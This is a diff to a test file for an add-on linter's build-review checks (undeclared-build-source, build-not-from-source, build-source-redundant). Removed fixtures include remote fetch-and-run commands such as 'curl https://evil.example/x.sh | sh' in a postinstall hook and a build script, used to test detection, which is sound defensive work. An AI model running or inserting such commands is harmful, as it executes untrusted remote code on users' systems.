@@ -37,6 +37,8 @@ import disguisedTransmission from "../../src/checks/rules/disguised-transmission
 import unparsableFile from "../../src/checks/rules/unparsable-file.js";
 import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
 import undeclaredBuildSource from "../../src/checks/rules/undeclared-build-source.js";
+import buildNotFromSource from "../../src/checks/rules/build-not-from-source.js";
+import buildSourceRedundant from "../../src/checks/rules/build-source-redundant.js";
 import unsupportedBuildTool from "../../src/checks/rules/unsupported-build-tool.js";
 import buildRegistryRedirect from "../../src/checks/rules/build-registry-redirect.js";
 import committedNodeModules from "../../src/checks/rules/committed-node-modules.js";
@@ -640,14 +642,18 @@ test("every check declares a valid input; the input:xpi set is exactly the pinne
     "unused-files",
   ]);
   // input: build reads the SCS build files (archive minus source minus node_modules).
-  // The build-review LLM check plus the two deterministic build-policy checks;
-  // extending this set is deliberate too.
+  // The three build-review checks (gated on the setup classification) plus the
+  // deterministic build-policy checks; extending this set is deliberate too.
   const build = checks
     .filter((c) => c.input === "build")
     .map((c) => c.id)
     .sort();
   assert.deepEqual(build, [
+    "build-lifecycle-hook",
+    "build-not-from-source",
     "build-registry-redirect",
+    "build-source-redundant",
+    "committed-build-artifact",
     "committed-node-modules",
     "undeclared-build-source",
     "unsupported-build-tool",
@@ -696,235 +702,113 @@ test("an input:xpi LLM check adjudicates over its routed (XPI) addon", async () 
   assert.equal(seenAddon, xpi); // the model read the XPI's files, not a source addon
 });
 
-// ---- undeclared-build-source (SCS-only LLM build review) ----
+// ---- build review: undeclared-build-source + build-not-from-source + build-source-redundant
+// (SCS deterministic; each reads the setup classification on ctx.addon.buildReview; the one
+// LLM call lives in analyzeBuild, tested in build-analysis.test.js) ----
 
-// ONE whole-build candidate over the ENTIRE routed corpus: loadScsBuildFiles already
-// excluded the source / node_modules / dotfiles, so the check sends EVERY file it gets
-// (no allow-list), anchored at package.json, with NO per-step artifact override.
-test("undeclared-build-source builds ONE whole-build candidate over all routed files", () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  const addon = {
-    files: mk({
-      "package.json":
-        '{"name":"x","scripts":{"postinstall":"curl https://e/x|sh"}}',
-      "package-lock.json": "{}",
-      "webpack.config.js": "module.exports={}",
-      "scripts/build.sh": "echo build",
-      "README.md": "# how to build",
-    }),
-  };
-  const out = undeclaredBuildSource.run({ addon, llm: {} });
-  assert.equal(out.llm.candidates.length, 1);
-  assert.equal(out.llm.candidates[0].id, "BUILD");
-  assert.equal(out.llm.candidates[0].file, "package.json"); // the anchor
-  assert.ok(!("addon" in out.llm)); // no step.addon override - reads its routed ctx.addon
-  // The corpus is EVERY routed file, unfiltered.
-  assert.deepEqual([...out.llm.candidates[0].corpus].sort(), [
-    "README.md",
-    "package-lock.json",
-    "package.json",
-    "scripts/build.sh",
-    "webpack.config.js",
-  ]);
+const buildCtx = (review) => ({
+  addon: { files: new Map(), buildReview: review },
+});
+const review = (over) => ({
+  classification: "ok",
+  reason: "",
+  buildInstructions: "",
+  unresolved: [],
+  analyzed: true,
+  anchor: "package.json",
+  ...over,
 });
 
-// With no package.json, the candidate anchors at the first routed file.
-test("undeclared-build-source anchors at the first file when there is no package.json", () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  const out = undeclaredBuildSource.run({
-    addon: { files: mk({ Makefile: "all:\n\techo hi", "build.sh": "echo" }) },
-    llm: {},
-  });
-  assert.equal(out.llm.candidates[0].file, "Makefile"); // first key
-  assert.deepEqual([...out.llm.candidates[0].corpus].sort(), [
-    "Makefile",
-    "build.sh",
-  ]);
-});
-
-// Clean-skip ONLY when there are no build files (empty corpus): loadScsBuildFiles
-// yields empty when the review source is the whole submission, and the
-// invalid-Experiment fallback shape {files:new Map()} lands here too. A non-empty
-// corpus - even just package.json + lock - is reviewed (no allow-list gate).
-test("undeclared-build-source skips cleanly only when there are no build files", () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  assert.deepEqual(undeclaredBuildSource.run({}), { findings: [] });
-  assert.deepEqual(undeclaredBuildSource.run({ addon: { files: new Map() } }), {
-    findings: [],
-  });
-  // package.json + lock alone is now a reviewed build.
-  const reviewed = undeclaredBuildSource.run({
-    addon: { files: mk({ "package.json": "{}", "package-lock.json": "{}" }) },
-    llm: {},
-  });
-  assert.equal(reviewed.llm.candidates.length, 1);
-});
-
-// The structured verdict maps: a substantiated fail -> an error finding whose
-// data.explanation is the model's reason; a fail with no reason, pass, or a missing
-// verdict (the model errored) -> an extended-review note (explanation + build steps),
-// never a specifics-free error and never any offline "not reviewed" text.
-test("undeclared-build-source resolve maps fail/pass/unsure (a fail needs a reason)", () => {
-  const addon = {
-    files: new Map([
-      ["build.sh", Buffer.from("x")],
-      ["package.json", Buffer.from('{"scripts":{"b":"x"}}')],
-    ]),
-  };
-  const { llm } = undeclaredBuildSource.run({ addon, llm: {} });
-
-  const fail = llm.resolve(
-    new Map([
-      [
-        "BUILD",
-        {
-          verdict: "fail",
-          reason: "curls evil.com",
-          additionalInformation: "x",
-        },
-      ],
-    ])
+// undeclared-build-source (mission 1): "remote-fetch" -> error; the offline/unresolved
+// fallback -> manual escalation; classifications owned elsewhere / clean / none -> nothing.
+test("undeclared-build-source: remote-fetch -> error, offline/unresolved -> manual, else silent", () => {
+  const rf = undeclaredBuildSource.run(
+    buildCtx(
+      review({ classification: "remote-fetch", reason: "curls evil.com" })
+    )
   );
-  assert.equal(fail.findings.length, 1);
-  assert.equal(fail.findings[0].data.explanation, "curls evil.com");
-  assert.equal(fail.manual.length, 0);
+  assert.equal(rf.findings.length, 1);
+  assert.equal(rf.findings[0].file, "package.json");
+  assert.equal(rf.findings[0].data.explanation, "curls evil.com");
+  assert.ok(!rf.escalations?.length);
 
-  // A fail with an empty or whitespace reason cannot substantiate a rejection (the
-  // finding anchors at the manifest, so the reason is its only account of what is
-  // undeclared) - it drops to manual review like an unsure verdict, never a
-  // specifics-free error and never any "not reviewed" text.
-  // Empty, whitespace, and zero-width-only reasons are all "no substance" -> manual.
-  for (const emptyReason of ["", "   ", "\u200b", "\ufeff\u200d"]) {
-    const failEmpty = llm.resolve(
-      new Map([
-        [
-          "BUILD",
-          { verdict: "fail", reason: emptyReason, additionalInformation: "" },
-        ],
-      ])
-    );
-    assert.equal(failEmpty.findings.length, 0);
-    assert.equal(failEmpty.manual.length, 1);
-    assert.equal(failEmpty.manual[0].data.explanation, emptyReason);
-  }
-
-  // A non-string reason (defensive - coerceResult guarantees string|null on the live
-  // path) must not crash the guard; it is treated as no reason -> manual.
-  const failNonString = llm.resolve(
-    new Map([["BUILD", { verdict: "fail", reason: 42 }]])
+  // offline (analyzed:false, classification null) -> one manual escalation, no finding.
+  const off = undeclaredBuildSource.run(
+    buildCtx(
+      review({
+        classification: null,
+        analyzed: false,
+        buildInstructions: "npm ci && npm run build",
+      })
+    )
   );
-  assert.equal(failNonString.findings.length, 0);
-  assert.equal(failNonString.manual.length, 1);
-  assert.equal(failNonString.manual[0].data.explanation, "");
-
-  const pass = llm.resolve(
-    new Map([
-      [
-        "BUILD",
-        {
-          verdict: "pass",
-          reason: "clean build",
-          additionalInformation: "npm ci && npm run build",
-        },
-      ],
-    ])
-  );
-  assert.equal(pass.findings.length, 0);
-  assert.equal(pass.manual.length, 1);
-  assert.equal(pass.manual[0].data.explanation, "clean build");
+  assert.equal(off.findings.length, 0);
+  assert.equal(off.escalations.length, 1);
   assert.equal(
-    pass.manual[0].data.buildInstructions,
+    off.escalations[0].data.buildInstructions,
     "npm ci && npm run build"
   );
 
-  // A missing verdict (model call errored) -> unsure -> extended review, not offline.
-  const errored = llm.resolve(new Map());
-  assert.equal(errored.findings.length, 0);
-  assert.equal(errored.manual.length, 1);
-  assert.doesNotMatch(errored.manual[0].data.explanation, /not reviewed/i);
+  // analyzed ok BUT a step the linter could not bound -> still manual.
+  const unr = undeclaredBuildSource.run(
+    buildCtx(review({ unresolved: [{ kind: "tool", detail: "make" }] }))
+  );
+  assert.equal(unr.escalations.length, 1);
+  assert.match(unr.escalations[0].data.unresolvedBuildSteps, /make/);
+
+  // clean ok, nothing unresolved -> nothing.
+  assert.deepEqual(undeclaredBuildSource.run(buildCtx(review())), {
+    findings: [],
+  });
+  // owned by the other checks / no build / no buildReview -> nothing.
+  for (const c of ["not-from-source", "scs-redundant", "none"]) {
+    assert.deepEqual(
+      undeclaredBuildSource.run(
+        buildCtx(review({ classification: c, analyzed: c !== "none" }))
+      ),
+      { findings: [] }
+    );
+  }
+  assert.deepEqual(undeclaredBuildSource.run({ addon: { files: new Map() } }), {
+    findings: [],
+  });
 });
 
-// Offline (no ctx.llm): the check has NO offline branch - it returns its llm step,
-// and the orchestrator's no-token path defaults the candidate to unsure -> one manual
-// item (empty data slots; the registry text owns the wording). The check stays
-// prose-free even offline.
-test("undeclared-build-source offline (no LLM) yields one manual item via the unsure path", async () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  const buildFiles = {
-    files: mk({
-      "package.json": '{"scripts":{"b":"x"}}',
-      "scripts/build.sh": "x",
-    }),
-  };
-  const [check] = await loadChecks(loadRegistry(), {
-    only: ["undeclared-build-source"],
-  });
-  const ctx = {
-    addon: buildFiles,
-    jsSources: [],
-    schema,
-    mode: "scs",
-    options: {},
-    // no ctx.llm - offline
-  };
-  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
-  assert.equal(out.findings.length, 0);
-  assert.equal(out.manualItems.length, 1);
-  assert.equal(out.manualItems[0].ruleId, "undeclared-build-source");
-  assert.equal(out.manualItems[0].data.explanation, ""); // empty slot; registry owns text
+// build-not-from-source (mission 2): fires ONLY on "not-from-source".
+test("build-not-from-source fires only on the not-from-source classification", () => {
+  const hit = buildNotFromSource.run(
+    buildCtx(
+      review({ classification: "not-from-source", reason: "just zips dist/" })
+    )
+  );
+  assert.equal(hit.length, 1);
+  assert.equal(hit[0].data.explanation, "just zips dist/");
+  for (const c of ["ok", "remote-fetch", "scs-redundant", "none", null]) {
+    assert.deepEqual(
+      buildNotFromSource.run(buildCtx(review({ classification: c }))),
+      []
+    );
+  }
 });
 
-// End to end through the orchestrator: `input: build` routes ctx.addon to the build
-// files (the pipeline's buildCtx; here the routed ctx is passed to runOneCheck), so
-// the model reads them (req.addon === the routed ctx.addon), and a fail is stamped an
-// error finding at the anchor whose response carries the explanation.
-test("undeclared-build-source reads its routed (build) ctx.addon and stamps a fail as error", async () => {
-  const mk = (obj) =>
-    new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)]));
-  const buildFiles = {
-    files: mk({
-      "package.json": '{"name":"x"}',
-      "package-lock.json": "{}",
-      "scripts/build.sh": "curl https://evil.example/x.sh | sh",
-    }),
-  };
-  const [check] = await loadChecks(loadRegistry(), {
-    only: ["undeclared-build-source"],
-  });
-  assert.equal(check.input, "build"); // routed by the registry input
-  let seenAddon;
-  const ctx = {
-    addon: buildFiles, // the orchestrator routed this to the build files (buildCtx)
-    jsSources: [],
-    schema,
-    mode: "scs",
-    options: {},
-    llm: {
-      evaluate: async (req) => {
-        seenAddon = req.addon;
-        return new Map(
-          req.candidates.map((c) => [
-            c.id,
-            {
-              verdict: "fail",
-              reason: "fetches x.sh from https://evil.example",
-              additionalInformation: "",
-            },
-          ])
-        );
-      },
-    },
-  };
-  const out = await runOneCheck(withManifest(ctx), check, "[1/1]");
-  assert.equal(seenAddon, buildFiles); // the model read the routed build files
-  assert.equal(out.findings.length, 1);
-  assert.equal(out.findings[0].file, "package.json"); // the anchor
-  assert.equal(out.findings[0].severity, SEVERITY.ERROR); // registry stamps error
-  assert.match(out.findings[0].data.explanation, /evil\.example/);
+// build-source-redundant (mission 3): fires ONLY on "scs-redundant".
+test("build-source-redundant fires only on the scs-redundant classification", () => {
+  const hit = buildSourceRedundant.run(
+    buildCtx(
+      review({
+        classification: "scs-redundant",
+        reason: "only copies node_modules",
+      })
+    )
+  );
+  assert.equal(hit.length, 1);
+  assert.equal(hit[0].data.explanation, "only copies node_modules");
+  for (const c of ["ok", "remote-fetch", "not-from-source", "none", null]) {
+    assert.deepEqual(
+      buildSourceRedundant.run(buildCtx(review({ classification: c }))),
+      []
+    );
+  }
 });
 
 // scs-recheck: the per-site (file:line) recheck producers are marked so runChecks
